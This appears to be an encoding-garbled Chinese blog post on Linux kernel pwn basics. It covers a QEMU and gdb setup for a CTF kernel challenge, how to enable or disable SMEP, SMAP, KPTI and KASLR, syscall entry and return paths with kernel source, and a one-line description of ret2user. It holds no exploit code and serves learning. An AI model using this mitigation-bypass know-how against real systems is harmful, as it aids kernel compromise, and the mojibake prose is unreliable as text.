<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>\</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤ä¼šåœ¨æœ¬æœº1234ç«¯å£ä¸Šç›‘å¬gdbé™„åŠ è°ƒè¯•</p>
<p>å¦‚æœä¸æƒ³ä½¿ç”¨gef,pwndbgç­‰æ’ä»¶,åªä½¿ç”¨è£¸gdbè°ƒè¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --nx vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h2 id="kernel-mitigation-features"><a href="#kernel-mitigation-features" class="headerlink" title="kernel mitigation features"></a>kernel mitigation features</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p><code>canary</code>: å†…æ ¸å †æ ˆé‡‘ä¸é›€</p>
<h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p><code>kaslr</code>: å†…æ ¸åœ°å€éšæœºåŒ–</p>
<h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG-KASLR"></a>FG-KASLR</h4><p>å‡½æ•°kaslr</p>
<p>ä¸å…‰å†…æ ¸é•œåƒæ•´ä½“åŸºåœ°å€ä¼šå˜</p>
<p>ä»£ç æ®µçš„ä¸€äº›å‡½æ•°ä¹Ÿä¼šéšæœºå˜ä½ç½®</p>
<h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p><code>smep(supervisor mode execution protection)</code>: å†…æ ¸æ€æ—¶ä¸å…è®¸æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç </p>
<blockquote>
<p><code>CR4</code>ç¬¬<code>20</code>ä½ç½®<code>1</code></p>
<p>å¼€å¯: <code>-cpu +smep</code></p>
<p>å…³é—­: <code>-append nosmep</code></p>
</blockquote>
<h3 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h3><p><code>smap(supervisor mode access prevention)</code>: å†…æ ¸æ€æ—¶ä¸å…è®¸è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®</p>
<blockquote>
<p>CR4ç¬¬21ä½ç½®1</p>
<p>å¼€å¯: <code>-cpu +smap</code></p>
<p>å…³é—­: <code>-append nosmap</code></p>
</blockquote>
<h3 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h3><p><code>kpti(kernel page table isolation)</code>, å†…æ ¸é¡µè¡¨éš”ç¦»</p>
<p>å¼€å¯æ—¶å¯ç”¨ä¸¤å¼ é¡µè¡¨, åœ¨å†…æ ¸æ€æ—¶çš„é¡µè¡¨åŒ…å«äº†å†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´</p>
<p>åœ¨ç”¨æˆ·æ€æ—¶çš„é¡µè¡¨æ˜¯åªæœ‰ç”¨æˆ·ç©ºé—´çš„æ‹·è´</p>
<p>å¼€å¯<code>-append kpti=1</code></p>
<p>å…³é—­<code>-append nopti</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<h2 id="context-switch"><a href="#context-switch" class="headerlink" title="context switch"></a>context switch</h2><p>ä»¥ç³»ç»Ÿè°ƒç”¨ä¸å…¶è¿”å›è¿‡ç¨‹ä¸ºä¾‹, è§‚å¯Ÿä¸Šä¸‹æ–‡åˆ‡æ¢è¿‡ç¨‹</p>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>ä»¥writeä¸ºä¾‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write @ linux0.12/lib/write.c</span></span><br><span class="line">_syscall3(<span class="type">int</span>, write, <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">off_t</span>, count)</span><br></pre></td></tr></table></figure>

<p><code>__syscalln</code>è¡¨ç¤ºæœ‰nä¸ªå‚æ•°çš„ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_syscall3 @ linux0.12/include/unistd.h</span></span><br><span class="line"><span class="comment">/* æœ‰3ä¸ªå‚æ•°çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°	type_name(atype a,btype b,ctype c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type, name, atype, a, btype, b, ctype, c) \</span></span><br><span class="line"><span class="meta">type name(atype a, btype b, ctype c) 				\</span></span><br><span class="line"><span class="meta">&#123; 													\</span></span><br><span class="line"><span class="meta">	long __res; 									\</span></span><br><span class="line"><span class="meta">	__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span>					\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;=a&quot;</span> (__res) 								\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;0&quot;</span> (__NR_##name), <span class="string">&quot;b&quot;</span> ((long)(a)), <span class="string">&quot;c&quot;</span> ((long)(b)), <span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (__res &gt;= 0) 								\</span></span><br><span class="line"><span class="meta">		return (type) __res; 						\</span></span><br><span class="line"><span class="meta">	errno = -__res; 								\</span></span><br><span class="line"><span class="meta">	return -1; 										\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šè°ƒç”¨çº¦å®š:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = __NR_write 	(writeçš„ç³»ç»Ÿè°ƒç”¨å·)</span><br><span class="line">rbx = fd 			(ç¬¬ä¸€ä¸ªå‚æ•°)</span><br><span class="line">rcx = buf 			(ç¬¬äºŒä¸ªå‚æ•°)</span><br><span class="line">rdx = count 		(ç¬¬ä¸‰ä¸ªå‚æ•°)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œ<code>int 0x80</code>æŒ‡ä»¤,</p>
<blockquote>
<p>æ‰€æœ‰çš„<code>int n</code>æŒ‡ä»¤,éƒ½å¯¹åº”åˆ°<code>IDT(Interrupt Describetor Table)</code><strong>ä¸­æ–­æè¿°ç¬¦è¡¨</strong>ä¸­çš„ä¸€ä¸ªé—¨</p>
<p><code>IDT</code>è¡¨å…±æœ‰<code>256</code>ä¸ªè¡¨é¡¹,ä¹Ÿå°±æ˜¯è¯´<code>int n</code>è¿™é‡Œçš„<code>n</code>èƒ½å¤Ÿå…è®¸çš„èŒƒå›´æ˜¯<code>0~255</code></p>
<p>å…¶ä¸­0~31é¡¹ä¿ç•™ç»™CPUå®šä¹‰çš„å¼‚å¸¸å’Œä¸­æ–­, ä¹Ÿå°±æ˜¯å†…éƒ¨ä¸­æ–­æˆ–å¼‚å¸¸</p>
<p>â€‹	æ¯”å¦‚int 0 è¡¨ç¤ºé™¤æ³•å‡ºé”™, ä¹Ÿå°±æ˜¯DIVå‡ºé”™</p>
<p>â€‹	æ¯”å¦‚int 3 è¡¨ç¤ºæ–­ç‚¹å‘½ä¸­</p>
<p>32~255ä¿ç•™ç»™ç”¨æˆ·æˆ–è€…è®¾å¤‡, ä¹Ÿå°±æ˜¯å¤–éƒ¨ä¸­æ–­æˆ–è€…å¼‚å¸¸</p>
<p>â€‹	æ¯”å¦‚int 0x80 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨</p>
<p>IDTè¡¨ä¸­æœ‰ä¸‰ç±»è¡¨é¡¹, ä¸­æ–­é—¨,é™·é˜±é—¨,ä»»åŠ¡é—¨</p>
</blockquote>
<p><code>int 0x80</code>è¿™æ¡æŒ‡ä»¤åœ¨<code>sched_init @ kernel/shed.c</code>ä¸­è¢«æ³¨å†Œä¸ºé™·é˜±é—¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sched_init @ kernel/shed.c</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n, addr) 	_set_gate(&amp;idt[n], 15, 3, addr)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥é™·é˜±é—¨ä¸­<code>system_call</code>å‡½æ•°è¢«æ³¨å†Œä¸ºä¸­æ–­å¤„ç†è¿‡ç¨‹</p>
<blockquote>
<p> <code>system_call</code>åœ¨<code>kernel/sys_call.s</code>ä¸­è¢«å®šä¹‰ä¸ºä¸€ä¸ªå‡½æ•°, æ˜¯æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨çš„å…¥å£, ä»¥eaxå¯„å­˜å™¨å€¼ä½œä¸ºç³»ç»Ÿè°ƒç”¨å·ç´¢å¼•å¯¹åº”ç³»ç»Ÿè°ƒç”¨å‡½æ•°</p>
</blockquote>
<p><code>int 0x80</code>è¿‡ç¨‹:</p>
<p>1.ç”±<code>IDTR</code>å¯„å­˜å™¨æŸ¥åˆ°<code>IDT</code>è¡¨åŸºåœ°å€</p>
<p>2.ä»¥<code>0x80</code>ä½œä¸ºç´¢å¼•æŸ¥<code>IDT</code>è¡¨å¾—åˆ°<code>IDT[0x80]</code>é—¨, æ˜¯ä¸€ä¸ªé™·é˜±é—¨</p>
<p>3.<code>IDT[0x80]</code>ä¸­è·å¾—(ä¸­æ–­å¤„ç†è¿‡ç¨‹æ‰€åœ¨æ®µçš„)æ®µé€‰æ‹©å­, é™·é˜±é—¨<code>DPL</code>, (ä¸­æ–­å¤„ç†è¿‡ç¨‹åœ¨å…¶)æ®µä¸­çš„åç§»é‡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120152851772.png" alt="image-20241120152851772"></p>
<p>4.ç”±æ®µé€‰æ‹©å­æŸ¥<code>LDT</code>æˆ–è€…<code>GDT</code>è¡¨è·å¾—ä¸­æ–­å¤„ç†è¿‡ç¨‹<code>system_call</code>æ‰€åœ¨æ®µ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120153036405.png" alt="image-20241120153036405"></p>
<p>ç„¶åæ®µåŸºåœ°å€åŠ ä¸Š<code>IDT</code>ä¸­ä¿ç•™çš„åç§»é‡æ‰¾åˆ°<code>system_call</code>å‡½æ•°åœ°å€</p>
<p>5.åœ¨è°ƒç”¨<code>system_call</code>å‡½æ•°ä¹‹å‰, éœ€è¦è€ƒè™‘å‰åæ®µå±æ€§æ˜¯å¦æœ‰æ”¹å˜</p>
<p>å¯¹äºç³»ç»Ÿè°ƒç”¨æ¥è¯´, æ˜¯ä»3ç¯ä¸Šç»è¿‡é™·é˜±é—¨è°ƒç”¨<code>0</code>ç¯ä¸Šçš„<code>system_call</code>, æ®µæƒé™å‘ç”Ÿäº†å˜åŒ–</p>
<p>å› æ­¤é¦–å…ˆåˆ‡æ¢å †æ ˆ, ä»ç”¨æˆ·å †æ ˆåˆ‡æ¢åˆ°å†…æ ¸å †æ ˆ, åˆ‡æ¢è¿‡ç¨‹:</p>
<p>â€‹	(1) ä»å½“å‰ç”¨æˆ·ä»»åŠ¡çš„TSSæ®µä¸­å¾—åˆ°<code>0</code>ç¯å †æ ˆçš„æ®µåœ°å€<code>ss0</code>å’Œæ ˆé¡¶æŒ‡é’ˆ<code>esp0</code></p>
<p>â€‹	(2) <code>ss3:esp3</code>æ›´æ¢ä¸º<code>ss0:esp0</code></p>
<p>â€‹	(3) <code>ss3:esp3</code>å‹åˆ°æ–°æ ˆä¸­ä¿å­˜, <code>eflags, cs:eip </code>ä¹Ÿä¾æ¬¡å‹å…¥æ–°æ ˆ</p>
<p>â€‹	(4) å¼‚å¸¸äº§ç”Ÿçš„é”™è¯¯å·å‹æ ˆ(å¦‚æœæœ‰çš„è¯)</p>
<p>å¯¹äºåŒçº§çš„ä¸­æ–­,æ¯”å¦‚å†…æ ¸ä¸­æ‰§è¡Œæ—¶é­é‡é™¤é›¶å¼‚å¸¸ç­‰,ä¸ä¼šå‘ç”Ÿå †æ ˆåˆ‡æ¢</p>
<p>â€‹	(1)<code>eflags, cs:eip</code> å‹æ ˆ</p>
<p>â€‹	(2)å¼‚å¸¸äº§ç”Ÿçš„é”™è¯¯å·å‹æ ˆ(å¦‚æœæœ‰çš„è¯)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120155553711.png" alt="image-20241120155553711"></p>
<p>6.æ­¤åå°±è¿è¡Œåœ¨å†…æ ¸æ€çš„<code>system_call</code>å‡½æ•°ä¸­äº†</p>
<p>7.å½“<code>system_call</code>è¦è¿”å›æ—¶,æœ€åä¼šæœ‰ä¸€æ¡<code>iret</code>æŒ‡ä»¤,è€Œä¸æ˜¯æ™®é€šçš„<code>ret</code>æŒ‡ä»¤</p>
<p>æ­¤æ—¶å†…æ ¸æ ˆæˆ–è€…è¯´<code>0</code>ç¯æ ˆä¸Šçš„çŠ¶æ€, å’Œåˆšè¿›å…¥<code>system_call</code>æ—¶ç›¸åŒ,</p>
<p><code>iret</code> æŒ‡ä»¤ä¼šæ ¹æ®æ ˆé¡¶ä¸Šçš„å†…å®¹è¿˜åŸåˆ°ä¹‹å‰çš„ç”¨æˆ·ç¨‹åºä¸­</p>
<blockquote>
<p> <code>ret2user</code>çš„åŸç†å°±æ˜¯åœ¨å†…æ ¸å †æ ˆä¸­ä¼ªé€ ä¸€ä¸ªå‡çš„ç”¨æˆ·ä¸Šä¸‹æ–‡,è®©<code>iret</code>è¿”å›åˆ°æ”»å‡»è€…æœŸæœ›çš„ç”¨æˆ·ç¨‹åºä¸­</p>
</blockquote>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>x64ä¸Šçš„ç³»ç»Ÿè°ƒç”¨ä¸å†ä½¿ç”¨ä¸­æ–­å‘é‡è¡¨, ä¹Ÿå°±æ˜¯è¯´ä¸ä¼šå†ä½¿ç”¨<code>int</code>ç³»æŒ‡ä»¤ </p>
<p>x64ä¸Šå¼•å…¥äº†æ–°çš„ä¸­æ–­æœºåˆ¶, å«åšAPIC, å¹¶ä¸”ç»™ç³»ç»Ÿè°ƒç”¨å®ç°äº†ä¸“é—¨çš„<code>syscall</code>æŒ‡ä»¤, </p>
<p>å¿…é¡»å°†ç³»ç»Ÿè°ƒç”¨å…¥å£å‡½æ•°<code>entry_SYSCALL_64</code>çš„åœ°å€, æ³¨å†Œåˆ°<code>MSR</code>å¯„å­˜å™¨ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@linux5.13/arch/x86/kernel/cpu/common.c/syscall_init.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	wrmsr(MSR_STAR, <span class="number">0</span>, (__USER32_CS &lt;&lt; <span class="number">16</span>) | __KERNEL_CS);</span><br><span class="line">	wrmsrl(MSR_LSTAR, (<span class="type">unsigned</span> <span class="type">long</span>)entry_SYSCALL_64);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<p>æ­¤åsyscallæŒ‡ä»¤ä¼šæŸ¥MSRå¯„å­˜å™¨,è·³åˆ°<code>entry_SYSCALL_64</code>ä¸­æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	<span class="comment">/* tss.sp2 is scratch space. */</span></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS				<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">	pushq	%r11					<span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">	pushq	$__USER_CS				<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx					<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to use SYSRET instead of IRET if we&#x27;re returning to</span></span><br><span class="line"><span class="comment">	 * a completely clean 64-bit userspace context.  If we&#x27;re not,</span></span><br><span class="line"><span class="comment">	 * go to the slow exit path.</span></span><br><span class="line"><span class="comment">	 * In the Xen PV case we must use iret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;&quot;</span>, <span class="string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \</span><br><span class="line">		X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	<span class="comment">/* SYSRET requires RCX == RIP */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP</span></span><br><span class="line"><span class="comment">	 * in kernel space.  This essentially lets the user take over</span></span><br><span class="line"><span class="comment">	 * the kernel, since userspace controls RSP.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span></span><br><span class="line"><span class="comment">	 * to be updated to remain correct on both old and new CPUs.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Change top bits to match most significant bit (47th or 56th bit</span></span><br><span class="line"><span class="comment">	 * depending on paging mode) in the address.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_5LEVEL</span></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">		<span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	shl	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">	sar	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If this changed %rcx, it was not canonical */</span></span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		<span class="comment">/* CS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		<span class="comment">/* R11 == RFLAGS */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span></span><br><span class="line"><span class="comment">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span></span><br><span class="line"><span class="comment">	 * need to restore it correctly.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span></span><br><span class="line"><span class="comment">	 * trap from userspace immediately after SYSRET.  This would cause an</span></span><br><span class="line"><span class="comment">	 * infinite loop whenever #DB happens with register state that satisfies</span></span><br><span class="line"><span class="comment">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span></span><br><span class="line"><span class="comment">	 * this user code:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *           movq	$stuck_here, %rcx</span></span><br><span class="line"><span class="comment">	 *           pushfq</span></span><br><span class="line"><span class="comment">	 *           popq %r11</span></span><br><span class="line"><span class="comment">	 *   stuck_here:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * would never get past &#x27;stuck_here&#x27;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* nothing to check for RSP */</span></span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		<span class="comment">/* SS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We win! This label is here just for ease of understanding</span></span><br><span class="line"><span class="comment">	 * perf profiles. Nothing jumps here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	<span class="comment">/* rcx and r11 are already restored (see code above) */</span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now all regs are restored except RSP and RDI.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	(%rdi)		<span class="comment">/* RDI */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	swapgs</span><br><span class="line">	sysretq</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œæ¯•åä½¿ç”¨sysretqè¿”å›åˆ°ç”¨æˆ·æ€</p>
<p>åœ¨x64ä¸Šæœ‰ä¸¤ç§è¿”å›åˆ°ç”¨æˆ·æ€çš„å‘½ä»¤</p>
<p><code>sysret</code>å’Œ<code>iret</code></p>
<p>æ³¨æ„åˆ°<code>x64</code>ä¸Š<code>syscall</code>ä¸€å¼€å§‹å’Œæœ€å<code>sysret</code>ä¹‹å‰, éƒ½æœ‰ä¸€ä¸ª<code>swapgs</code>, è¿™ä¸ªæŒ‡ä»¤ä¹Ÿæ˜¯<code>x64</code>ç‹¬æœ‰çš„</p>
<p><code>fs,gs</code>è¿™ä¸¤ä¸ªæ®µå¯„å­˜å™¨æ˜¯<code>x86</code>ä¸Šå¼•å…¥çš„ä¸¤ä¸ªé™„åŠ æ®µå¯„å­˜å™¨</p>
<p><code>fs</code>ç”¨äºåœ¨ç”¨æˆ·æ€çš„<code>glibc</code>ä¸­ä¿å­˜<code>TLS</code></p>
<p><code>gs</code>ç”¨äºåœ¨å†…æ ¸æ€ä¿å­˜<code>percpu</code>å˜é‡ä¸<code>canary</code></p>
<p><code>fs</code>åœ¨å†…æ ¸æ€æ— ç”¨,<code>gs</code>åœ¨ç”¨æˆ·æ€æ— æ•ˆ</p>
